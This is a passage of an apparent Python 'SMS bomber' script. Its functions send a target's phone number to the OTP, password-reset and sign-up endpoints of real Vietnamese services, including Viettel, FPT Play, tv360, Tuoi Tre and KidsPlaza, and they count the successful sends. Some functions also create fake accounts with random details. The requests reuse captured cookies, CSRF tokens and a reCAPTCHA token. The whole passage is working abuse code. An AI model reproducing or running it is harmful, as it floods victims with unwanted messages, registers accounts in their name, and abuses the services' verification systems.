        'type': 1,
    }

    response = requests.post('https://api.alfrescos.com.vn/api/v1/User/SendSms', params=params, headers=headers, json=json_data)
    thanhcong+=1

#sms 44
def sms44(phone):
    global thanhcong
    requests.post("http://m.tv360.vn/public/v1/auth/get-otp-login", headers={"Host": "m.tv360.vn","Connection": "keep-alive","Content-Length": "23","Accept": "application/json, text/plain, */*","User-Agent": "Mozilla/5.0 (Linux; Android 10; moto e(7i) power Build/QOJ30.500-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36","Content-Type": "application/json","Origin": "http://m.tv360.vn","Referer": "http://m.tv360.vn/login?r\u003dhttp%3A%2F%2Fm.tv360.vn%2F","Accept-Encoding": "gzip, deflate"}, json=({"msisdn":"0"+phone[1:11]})).text
    thanhcong+=1
#sms 48
def sms48(phone):
    global thanhcong
    headers = {
        'authority': 'api.fptplay.net',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'content-type': 'application/json; charset=UTF-8',
        'dnt': '1',
        'origin': 'https://fptplay.vn',
        'referer': 'https://fptplay.vn/',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'x-did': 'C6FBA049F2980119',
    }

    json_data = {
        'phone': '0357497742',
        'country_code': 'VN',
        'client_id': 'vKyPNd1iWHodQVknxcvZoWz74295wnk8',
    }

    response = requests.post(
        'https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st=lEOM_F9IetEq7ItOQFdehw&e=1693621809&device=Chrome(version%253A116.0.0.0)&drm=1',
        headers=headers,
        json=json_data,
    )
    thanhcong+=1
def sms481(phone):
    global thanhcong
    headers = {
        'authority': 'api.fptplay.net',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'content-type': 'application/json; charset=UTF-8',
        'dnt': '1',
        'origin': 'https://fptplay.vn',
        'referer': 'https://fptplay.vn/',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'x-did': 'C6FBA049F2980119',
    }

    json_data = {
        'phone': '0357497741',
        'country_code': 'VN',
        'client_id': 'vKyPNd1iWHodQVknxcvZoWz74295wnk8',
    }

    response = requests.post(
        'https://api.fptplay.net/api/v7.1_w/user/otp/reset_password_otp?st=YBn3rEiWDyxmVpLeTEvPag&e=1693621919&device=Chrome(version%253A116.0.0.0)&drm=1',
        headers=headers,
        json=json_data,
    )
    thanhcong+=1
#sms49
def sms49(phone):
    mail = random_string(6)
    Headers = {"Host": "api.ahamove.com","content-length": "114","sec-ch-ua": "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"","accept": "application/json, text/plain, */*","content-type": "application/json;charset\u003dUTF-8","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","sec-ch-ua-platform": "\"Android\"","origin": "https://app.ahamove.com","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://app.ahamove.com/","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Datason = json.dumps({"mobile":f"{phone[1:11]}","name":"Tuấn","email":f"{mail}@gmail.com","country_code":"VN","firebase_sms_auth":"true"})
    Response = requests.post("https://api.ahamove.com/api/v3/public/user/register", data=Datason, headers=Headers)
#sms 52
def sms52(phone):
    cookies = {
        'laravel_session': '7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2',
        '__zi': '2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1',
        'redirectLogin': 'https://viettel.vn/dang-ky',
        'XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2; __zi=2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1; redirectLogin=https://viettel.vn/dang-ky; XSRF-TOKEN=eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/dang-ky',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBK',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ==',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'msisdn': phone,
    }

    response = requests.post('https://viettel.vn/api/get-otp', cookies=cookies, headers=headers, json=json_data)
#sms 53
def sms53(phone):
    global thanhcong
    global thatbai
    cookies = {
        '_gid': 'GA1.2.487775631.1691205495',
        '_gat_UA-46730129-1': '1',
        '_gat_tto_vcc': '1',
        '_ga': 'GA1.1.313505025.1691205495',
        '_clck': '129tle5|2|fdw|0|1312',
        '_ga_G67558G6BB': 'GS1.2.1691205497.1.0.1691205497.0.0.0',
        '_ttsid': 'db32f4eb371c80d90041abe3becf48c8eac315f88006319ce369feb261c1c84e',
        '_cc_id': 'd1c8c8270bb36d6698f3fe5b93daf511',
        'panoramaId_expiry': '1691810302593',
        'panoramaId': 'b47a113151cf80fae3f4faa2e94316d53938c967f63169983cf05bd58bd1569b',
        'panoramaIdType': 'panoIndiv',
        '_clsk': 'ovnkgb|1691205498930|1|0|y.clarity.ms/collect',
        '_uidcms': '169120549895246028',
        'FCNEC': '%5B%5B%22AKsRol9yczFs8umaD-re__dsXaS0dRTfrahAAoYEPXVeOQ4OC9ZiNrvTdobIcxgc8RF8ebYl5idX1xpalsZcEeKlHOnhTbigao23hZOAB33ksfORr-X5yyKuoNa8pltGj5eprvHgybgYmahSi0Z63bBTwSOvx80_SA%3D%3D%22%5D%2Cnull%2C%5B%5D%5D',
        'XSRF-TOKEN': 'eyJpdiI6InI4QmZUckNaRzJ3QkhXYXNlSU1Banc9PSIsInZhbHVlIjoiTngzUm5pS2lhNyt1WDFrVDFWTThGSjJkaEhxU3g4VHRwTTJlcnVqazZSa0xZUFZ1QXZXSktiL20zNGZBZiszVVNvZHVOTUtzbTFGdXZ0RUIxTEdFbXp5c04wWTJJdDNxSmZNME00U0lhS29yNVRhOGoyUDVNRGplZkVNMmZmUW4iLCJtYWMiOiIzZTRkNGY4ZTIxM2M3ODhhYmEwYjkyMGI0Yzc4MTQyOGIzNmY4MDJmN2I1Nzk4NWRmM2MzZmVmZmI3ZmVhYWZmIiwidGFnIjoiIn0%3D',
        'SSO_SID': 'eyJpdiI6ImdMbjZZUzlwaFhzNnlETmM4WHRtbHc9PSIsInZhbHVlIjoiYU5CczhvUVoySXRzeXp5LzhvQW9KalhLMGNBVUpYQkJLb0F6NUFyN3IrQmd1Wm1yeENvYStkcGMzZ3Z6V3ZVNG5lZENES2d4ZldaZnVmUXdxSWlodXNDWnpDN3E5YzEwUXAwS3p1cFkyMFBuRzZtd0JhdnJqK3hKbHpwNmFoVWUiLCJtYWMiOiIzN2RhYWE1NjExMjZiZDRjYWIzMjEwMzBlMDdmODc4YzNlNTUxZDZjOWJiZjE3ZjkyNjljOWZiNjE3NjY4YjU4IiwidGFnIjoiIn0%3D',
        '_ga_8KQ37P0QJM': 'GS1.1.1691205495.1.1.1691205499.56.0.0',
    }

    headers = {
        'authority': 'sso.tuoitre.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryYji8gh5EsBRK15cc',
        # 'cookie': '_gid=GA1.2.487775631.1691205495; _gat_UA-46730129-1=1; _gat_tto_vcc=1; _ga=GA1.1.313505025.1691205495; _clck=129tle5|2|fdw|0|1312; _ga_G67558G6BB=GS1.2.1691205497.1.0.1691205497.0.0.0; _ttsid=db32f4eb371c80d90041abe3becf48c8eac315f88006319ce369feb261c1c84e; _cc_id=d1c8c8270bb36d6698f3fe5b93daf511; panoramaId_expiry=1691810302593; panoramaId=b47a113151cf80fae3f4faa2e94316d53938c967f63169983cf05bd58bd1569b; panoramaIdType=panoIndiv; _clsk=ovnkgb|1691205498930|1|0|y.clarity.ms/collect; _uidcms=169120549895246028; FCNEC=%5B%5B%22AKsRol9yczFs8umaD-re__dsXaS0dRTfrahAAoYEPXVeOQ4OC9ZiNrvTdobIcxgc8RF8ebYl5idX1xpalsZcEeKlHOnhTbigao23hZOAB33ksfORr-X5yyKuoNa8pltGj5eprvHgybgYmahSi0Z63bBTwSOvx80_SA%3D%3D%22%5D%2Cnull%2C%5B%5D%5D; XSRF-TOKEN=eyJpdiI6InI4QmZUckNaRzJ3QkhXYXNlSU1Banc9PSIsInZhbHVlIjoiTngzUm5pS2lhNyt1WDFrVDFWTThGSjJkaEhxU3g4VHRwTTJlcnVqazZSa0xZUFZ1QXZXSktiL20zNGZBZiszVVNvZHVOTUtzbTFGdXZ0RUIxTEdFbXp5c04wWTJJdDNxSmZNME00U0lhS29yNVRhOGoyUDVNRGplZkVNMmZmUW4iLCJtYWMiOiIzZTRkNGY4ZTIxM2M3ODhhYmEwYjkyMGI0Yzc4MTQyOGIzNmY4MDJmN2I1Nzk4NWRmM2MzZmVmZmI3ZmVhYWZmIiwidGFnIjoiIn0%3D; SSO_SID=eyJpdiI6ImdMbjZZUzlwaFhzNnlETmM4WHRtbHc9PSIsInZhbHVlIjoiYU5CczhvUVoySXRzeXp5LzhvQW9KalhLMGNBVUpYQkJLb0F6NUFyN3IrQmd1Wm1yeENvYStkcGMzZ3Z6V3ZVNG5lZENES2d4ZldaZnVmUXdxSWlodXNDWnpDN3E5YzEwUXAwS3p1cFkyMFBuRzZtd0JhdnJqK3hKbHpwNmFoVWUiLCJtYWMiOiIzN2RhYWE1NjExMjZiZDRjYWIzMjEwMzBlMDdmODc4YzNlNTUxZDZjOWJiZjE3ZjkyNjljOWZiNjE3NjY4YjU4IiwidGFnIjoiIn0%3D; _ga_8KQ37P0QJM=GS1.1.1691205495.1.1.1691205499.56.0.0',
        'dnt': '1',
        'origin': 'https://sso.tuoitre.vn',
        'referer': 'https://sso.tuoitre.vn/login?redirectUrl=https%3A%2F%2Ftuoitre.vn%2Fdang-ky-tuoi-tre-sao.htm&state=eyJpdiI6IjVYWUROWm1FS0c1bldIM2M3SGM2d0E9PSIsInZhbHVlIjoiTkdiamQyZ0Nzam9jbzFmS280Smp1bS96YnQ2QzVDSlVZeENSekcxcXdWNFA5cUN4dGx3L2lJQUx4ekZDVFJCTFpsbDBtTlYvRU05YldEUHl5ZkpmTG0zRkJnazVYT0ZMTVEyMUd3c0xldVdobzltS2g0UjdVSjlqSkRmd0dPY2lrNGl5REE2a1hkbXpRMUVNcUMycG9LTGF3WnFCVkl0NUdtRjVDNzFHbndYaXhRUjUvcTgzdW9Bd1ErWXdvSE1TNC8rUUVtYlhCMlFWRmZoVnpjbW55ZExZZVQxWjMyN29oZ25hODZvZXBRSWxPVXNOeFc0UGFjMDk0a0l5aXpRb2wreSt2Q3EzckFLWTh4L1oxOXBKdlJrVThsQTdLaVZEOWE3NGMrQWF6RmpZYTdJekVZMzhCNWNqUTFpZ0Fta0lERVE3bGYrRktnTlFJSzBtS3VzU09EMVA2NjhBV1hJT1pLM1RCOVpCOVB1Q25XNFdadUZXZkxrc2hTaG9TNCtPIiwibWFjIjoiN2E0MGViMjY3ZDUzYjRjZGQ5NjNjNmZmNDZlNzNlY2RjYjUxYmI1MDVkY2U5MWRjNDM1NDU5MWE1NzIxMjZmMyIsInRhZyI6IiJ9',
        'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
        'x-csrf-token': 'poxEgxeU3OWmZ94Wk449TVjRyOLgSJ23Bz2b9kBe',
        'x-requested-with': 'XMLHttpRequest',
        'x-xsrf-token': 'eyJpdiI6InI4QmZUckNaRzJ3QkhXYXNlSU1Banc9PSIsInZhbHVlIjoiTngzUm5pS2lhNyt1WDFrVDFWTThGSjJkaEhxU3g4VHRwTTJlcnVqazZSa0xZUFZ1QXZXSktiL20zNGZBZiszVVNvZHVOTUtzbTFGdXZ0RUIxTEdFbXp5c04wWTJJdDNxSmZNME00U0lhS29yNVRhOGoyUDVNRGplZkVNMmZmUW4iLCJtYWMiOiIzZTRkNGY4ZTIxM2M3ODhhYmEwYjkyMGI0Yzc4MTQyOGIzNmY4MDJmN2I1Nzk4NWRmM2MzZmVmZmI3ZmVhYWZmIiwidGFnIjoiIn0=',
    }

    data = '------WebKitFormBoundaryYji8gh5EsBRK15cc\r\nContent-Disposition: form-data; name="hiddenBackUrl"\r\n\r\nhttps://tuoitre.vn/dang-ky-tuoi-tre-sao.htm\r\n------WebKitFormBoundaryYji8gh5EsBRK15cc\r\nContent-Disposition: form-data; name="username"\r\n\r\n'+phone+'\r\n------WebKitFormBoundaryYji8gh5EsBRK15cc\r\nContent-Disposition: form-data; name="password"\r\n\r\nqwer1234!@#$\r\n------WebKitFormBoundaryYji8gh5EsBRK15cc\r\nContent-Disposition: form-data; name="g-recaptcha-response"\r\n\r\n03ADUVZwAmhiI33l_Yy9fKDjHwlObce9nxv9TyhT7IDlJMwgM9CR-Yh21U9BgLW8Rpjye-RK8T08Go7w7_pknJwXVZhUUhl4pDU8v-iUXAOUHTOMfINFiu5YF0QzScdzKfnhcw7ki1ZIM1fP-njzYxSmtcQgiDKwdlQ2_uJxR4z4jLDEBlbu1xW6Fy7lX3VStEuL7iZQRpq_aPdwpOyCIh7VUlkaLO65Voo6ToymHy-KsXlLf4wmOnxDVEJJ2Jd7ib10KpadJcI09HXcLymVSP1Um1QxXwgXtqFvYBG5Xmxsdveg0JRxsX36u6wm0ZjKxNz4b-2E6N6mgC9vE8xPWM80WqCHo9S0LMndHqc5rTiEOcRl6lXQZXZR2yKXFQnBGbH2DPMm_yIfdL7rl8mheJ8Hr_oAVyxdb9SU6slSevwHUbaEpOFT558y3ZR1ydgV7sZgBdwY_F2vkDLJSOLfLlDAZd5JVvucBEb_TavalxBoYW09pMbJzAeHgt5ipBFdnjzAF6ILur7Sisgih29gdEmrO8eVrS3gE1DvQ0DF4HIl_ABpU3CKhLs1A7Uo1kQxqsW2jFlr5VvSwl1YBY13CuYQpvcy_G9FzhzK2djrgj71JyvCcHEH7Ppdj6ma3p_iZug2PIwpgHoIICIoR6h_3ygv9IHshKT6y8X2M3tIm2axQ4oR67FLhSOkWWztpYb0gGQUFVdohTV5fq9-haohs-xtmTuIAI04VJkyIShYLhk9WARXfTY9tZHO30fPqo69kSp4oYEmhiNm6jhmV8gUu4kuy9QfrGIQIzL38CcFu4nirdNuRsyeESZcl7qTxdYzj12j9_BMz5EdBN4GA0InHMF0M4uw-AEiK2bDMwwns4yH10ovyW60YrabSXtpa50CvEm6lGMefnCFWw5wMDRvVfugaoFqdv20k7SfLx2omR4x5khMizbxoHR8VBfDfpHhK5DaQ1AFe3nwyVCq1defcPJfWcb7tQlE1U1urM0fWnA2A5qQo-kN_9MwOO43HYQbaPV8tptK54PQoVfrrtRLqq48dprhaLv1DLDKRpHagU7_Odz5Gp4j-bL21whrKWYESfi6n0goFuy2ANiyrlIJs1yym_JteeSFDLKDOvjWv1ulK3-aWR4hefWpoLNcSqGL0IDTTP-L6Pnr2yx-kUMAR3oKUzLgORWH2cLYIHOyTrBj2ATUUwWN9F3GVKVc8k44Fu-1UamzZG61O2BA9-N-_Gb8cT6B7RBrubfKpYUqQzYREqOzwMJIodH0wtbmhTjH5tRtPEr7p4H1Klip4mr0J_6zHvljFNLzga8CYTV8_bGXB6GFPEckmkdGXwmWgLseYKJJgmrlJFPpBpf0qqan-1p6hbqipMy5lFVKpYvNHqL33TSGL7ghaiyuMAy8qdX8BVAF-1q08KFFBQQgGyzanHdnZeTfsJCoTVVWHFu3xNiAPEGOdj3z0wDL0R2H4EfldhYP1CyofnZB5tTK1U51jrTTT1e_1xjp8KE6SbQ6hMuuYNiCfa7Nfyv4LDrYlD2C6sjaG-vON_fDzQ\r\n------WebKitFormBoundaryYji8gh5EsBRK15cc\r\nContent-Disposition: form-data; name="state"\r\n\r\neyJpdiI6IjVYWUROWm1FS0c1bldIM2M3SGM2d0E9PSIsInZhbHVlIjoiTkdiamQyZ0Nzam9jbzFmS280Smp1bS96YnQ2QzVDSlVZeENSekcxcXdWNFA5cUN4dGx3L2lJQUx4ekZDVFJCTFpsbDBtTlYvRU05YldEUHl5ZkpmTG0zRkJnazVYT0ZMTVEyMUd3c0xldVdobzltS2g0UjdVSjlqSkRmd0dPY2lrNGl5REE2a1hkbXpRMUVNcUMycG9LTGF3WnFCVkl0NUdtRjVDNzFHbndYaXhRUjUvcTgzdW9Bd1ErWXdvSE1TNC8rUUVtYlhCMlFWRmZoVnpjbW55ZExZZVQxWjMyN29oZ25hODZvZXBRSWxPVXNOeFc0UGFjMDk0a0l5aXpRb2wreSt2Q3EzckFLWTh4L1oxOXBKdlJrVThsQTdLaVZEOWE3NGMrQWF6RmpZYTdJekVZMzhCNWNqUTFpZ0Fta0lERVE3bGYrRktnTlFJSzBtS3VzU09EMVA2NjhBV1hJT1pLM1RCOVpCOVB1Q25XNFdadUZXZkxrc2hTaG9TNCtPIiwibWFjIjoiN2E0MGViMjY3ZDUzYjRjZGQ5NjNjNmZmNDZlNzNlY2RjYjUxYmI1MDVkY2U5MWRjNDM1NDU5MWE1NzIxMjZmMyIsInRhZyI6IiJ9\r\n------WebKitFormBoundaryYji8gh5EsBRK15cc\r\nContent-Disposition: form-data; name="backUrl"\r\n\r\nhttps://sso.tuoitre.vn/register-success\r\n------WebKitFormBoundaryYji8gh5EsBRK15cc\r\nContent-Disposition: form-data; name="userAgent"\r\n\r\nMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36\r\n------WebKitFormBoundaryYji8gh5EsBRK15cc\r\nContent-Disposition: form-data; name="deviceType"\r\n\r\ndesktop\r\n------WebKitFormBoundaryYji8gh5EsBRK15cc--\r\n'

    response = requests.post('https://sso.tuoitre.vn/register-v2', cookies=cookies, headers=headers, data=data)
    if 'success' in response.text:
        thanhcong+=1
    else:
        thatbai+=1
#sms 55
def sms55(phone):
    global thanhcong
    global thatbai
    pw=generate_random(30)
    ten= generate_random(2) + ' ' + generate_random(4) + ' '+ generate_random(4)
    gmail = generate_random(10)+ '@gmail.com'
    cookies = {
        'PHPSESSID': 'np5bjstqr3q3ro16kdss1cdqqt',
        '__Secure-API_SESSION': 'np5bjstqr3q3ro16kdss1cdqqt',
        'cdp_customerIdentify': '1',
        '_gcl_au': '1.1.309224132.1693617313',
        'mage-cache-storage': '%7B%7D',
        'mage-cache-storage-section-invalidation': '%7B%7D',
        '_pk_ses.564990546.fc16': '*',
        'form_key': 'grrIeN0FEm877JGd',
        'mage-cache-sessid': 'true',
        'recently_viewed_product': '%7B%7D',
        'recently_viewed_product_previous': '%7B%7D',
        'recently_compared_product': '%7B%7D',
        'recently_compared_product_previous': '%7B%7D',
        'product_data_storage': '%7B%7D',
        '_cdp_cfg': '1',
        '_ac_client_id': '1200823713.1691205846',
        '_asm_visitor_type': 'r',
        '_ac_au_gt': '1693617324',
        'mage-messages': '',
        'form_key': 'grrIeN0FEm877JGd',
        '_ga': 'GA1.1.1295575943.1693617323',
        'cdp_blocked_sid_5056307': '1',
        '_tt_enable_cookie': '1',
        '_ttp': 'UXDEm7mLSWGVtzhXkgs3Tjm40ml',
        'store': 'hcm',
        'private_content_version': 'updated-64f28cb70fef83.63036361',
        'X-Magento-Vary': 'e46423ae947909f49073dd3d5e74aa7e8975e2be',
        '_pk_id.564990546.fc16': '1200823713.1693617318.1.1693617335.1693617318.',
        '_ga_T93VCQ3ZQS': 'GS1.1.1693617323.1.1.1693617338.45.0.0',
        'cto_bundle': 'oggz0V95MFJDdjYwVEZLR0pveGFIQzZENnczdHo2VWlqcSUyRmtRWFZUbnlKRkhrRmRRZHFNMzdmZVdLdDc2NjRIZXBFOXlNREF5ZHF6STJzY0dkdElHZlY3REVXSldEaE00MFh5Z0tma3dCNVFESWpiRm9WT282T0h5cm9tMkpqbFNzc0ZCS3QxSnVKSEI5bjZlTkV4TlE2Qk1ydyUzRCUzRA',
        '_ac_an_session': 'zmzkzizqzlzjzhzmzmzqzdzjzdzizlzqzgzlzizkzgznzjzdzizdzizlzqzgzlzizkzgznzjzdzizlzqzgzlzizkzgznzjzdzizdzezizdzjzd1x1uzdzgzdzhzgzqznznzd',
        'cdp_blocked_sid_822178': '2',
        'section_data_ids': '%7B%22customer%22%3A1693617326%2C%22shipping_address_selected%22%3A1693617348%2C%22cart%22%3A1693617349%2C%22messages%22%3A1693617335%2C%22compare-products%22%3A1693617347%2C%22last-ordered-items%22%3A1693617347%2C%22directory-data%22%3A1693617347%2C%22captcha%22%3A1693617347%2C%22instant-purchase%22%3A1693617347%2C%22persistent%22%3A1693617347%2C%22review%22%3A1693617347%2C%22wishlist%22%3A1693617347%2C%22faq%22%3A1693617347%2C%22ammessages%22%3A1693617347%2C%22rewards%22%3A1693617347%2C%22ins%22%3A1693617347%2C%22custom_address_local_storage_data%22%3A1693617347%2C%22recently_viewed_product%22%3A1693617347%2C%22recently_compared_product%22%3A1693617347%2C%22product_data_storage%22%3A1693617347%2C%22paypal-billing-agreement%22%3A1693617347%7D',
    }

    headers = {
        'authority': 'www.kidsplaza.vn',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'content-type': 'application/json',
        # 'cookie': 'PHPSESSID=np5bjstqr3q3ro16kdss1cdqqt; __Secure-API_SESSION=np5bjstqr3q3ro16kdss1cdqqt; cdp_customerIdentify=1; _gcl_au=1.1.309224132.1693617313; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; _pk_ses.564990546.fc16=*; form_key=grrIeN0FEm877JGd; mage-cache-sessid=true; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; _cdp_cfg=1; _ac_client_id=1200823713.1691205846; _asm_visitor_type=r; _ac_au_gt=1693617324; mage-messages=; form_key=grrIeN0FEm877JGd; _ga=GA1.1.1295575943.1693617323; cdp_blocked_sid_5056307=1; _tt_enable_cookie=1; _ttp=UXDEm7mLSWGVtzhXkgs3Tjm40ml; store=hcm; private_content_version=updated-64f28cb70fef83.63036361; X-Magento-Vary=e46423ae947909f49073dd3d5e74aa7e8975e2be; _pk_id.564990546.fc16=1200823713.1693617318.1.1693617335.1693617318.; _ga_T93VCQ3ZQS=GS1.1.1693617323.1.1.1693617338.45.0.0; cto_bundle=oggz0V95MFJDdjYwVEZLR0pveGFIQzZENnczdHo2VWlqcSUyRmtRWFZUbnlKRkhrRmRRZHFNMzdmZVdLdDc2NjRIZXBFOXlNREF5ZHF6STJzY0dkdElHZlY3REVXSldEaE00MFh5Z0tma3dCNVFESWpiRm9WT282T0h5cm9tMkpqbFNzc0ZCS3QxSnVKSEI5bjZlTkV4TlE2Qk1ydyUzRCUzRA; _ac_an_session=zmzkzizqzlzjzhzmzmzqzdzjzdzizlzqzgzlzizkzgznzjzdzizdzizlzqzgzlzizkzgznzjzdzizlzqzgzlzizkzgznzjzdzizdzezizdzjzd1x1uzdzgzdzhzgzqznznzd; cdp_blocked_sid_822178=2; section_data_ids=%7B%22customer%22%3A1693617326%2C%22shipping_address_selected%22%3A1693617348%2C%22cart%22%3A1693617349%2C%22messages%22%3A1693617335%2C%22compare-products%22%3A1693617347%2C%22last-ordered-items%22%3A1693617347%2C%22directory-data%22%3A1693617347%2C%22captcha%22%3A1693617347%2C%22instant-purchase%22%3A1693617347%2C%22persistent%22%3A1693617347%2C%22review%22%3A1693617347%2C%22wishlist%22%3A1693617347%2C%22faq%22%3A1693617347%2C%22ammessages%22%3A1693617347%2C%22rewards%22%3A1693617347%2C%22ins%22%3A1693617347%2C%22custom_address_local_storage_data%22%3A1693617347%2C%22recently_viewed_product%22%3A1693617347%2C%22recently_compared_product%22%3A1693617347%2C%22product_data_storage%22%3A1693617347%2C%22paypal-billing-agreement%22%3A1693617347%7D',
        'dnt': '1',
        'origin': 'https://www.kidsplaza.vn',
        'referer': 'https://www.kidsplaza.vn/',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    json_data = {
        'data': {
            'password': pw,
            'confirm_password': pw,
            'phone': phone,
            'email': gmail,
            'name': ten,
            'website_id': '2',
        },
    }

    response = requests.post(
        'https://www.kidsplaza.vn/rest/hcm/V1/customer/account/register/on-site',
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
    if response.ok:
        thanhcong+=1
    else:
        thatbai+=1
#sms 56
def sms56(phone):
    global thanhcong
    global thatbai
    headers = {
        "Host": "id.icankid.vn",
        "Connection": "keep-alive",
        "Content-Length": "134",
        "sec-ch-ua-platform": "\"Android\"",
        "sec-ch-ua-mobile": "?1",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "content-type": "application/json",
        "Accept": "*/*",
        "Origin": "https://id.icankid.vn",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://id.icankid.vn/auth",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4",
